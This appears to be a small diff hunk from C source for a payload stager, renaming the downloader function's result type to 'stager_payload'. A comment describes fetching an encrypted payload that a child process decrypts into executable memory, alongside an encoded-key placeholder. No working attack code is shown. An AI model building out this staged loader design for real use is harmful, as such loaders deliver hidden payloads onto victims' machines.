@@ -45,7 +45,7 @@ static const unsigned char encoded_key[] = {ENCODED_KEY};
  * child) can decrypt it into an RX view. The downloader never executes or
  * decrypts the payload itself.
  */
-void downloader_main(struct download_result *res) {
+void downloader_main(struct stager_payload *res) {
   res->data = NULL;
   res->size = 0;
 
